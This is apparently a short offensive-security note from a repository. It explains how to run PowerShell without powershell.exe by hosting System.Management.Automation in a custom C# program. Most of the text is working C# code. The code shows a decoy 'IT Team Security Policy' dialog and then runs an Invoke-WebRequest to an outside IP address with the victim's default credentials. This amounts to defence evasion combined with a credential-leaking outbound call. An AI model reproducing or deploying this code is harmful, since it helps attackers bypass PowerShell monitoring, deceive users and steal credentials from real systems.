### Powershell Attack Without Powershell.exe
The Powershell.exe is just interpret of .NET assembly System.Management.Automation.dll to execute OS Command and invoke PowerShell commands.
System.Management.Automation.dll file is loaded when powershell.exe open up. hence I do not rely on powershell.exe to execute OS command and Invoke powershell command, 
because We can write our own interpreter to execucate any OS Command without having powershell.exe.

![Image of Yaktocat](https://raw.githubusercontent.com/NyaMeeEain/Infrastructure-Assessment/master/Images/PS_WT.PNG)

```
using System;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;
using System.Windows.Forms;

public class Program
{
    public static void Main()
    {
        MessageBox.Show("Loading Security Services...", "IT Team Security Policy", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
    }
    public class Code
    {
        public static void Exec()
        {
            string command = "Invoke-WebRequest -URI http://192.168.200.128:80/a -UseDefaultCredentials > null";
            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
            rspace.Open();
            Pipeline pipeline = rspace.CreatePipeline();
            pipeline.Commands.AddScript(command);
            pipeline.Invoke();
        }
    }
}
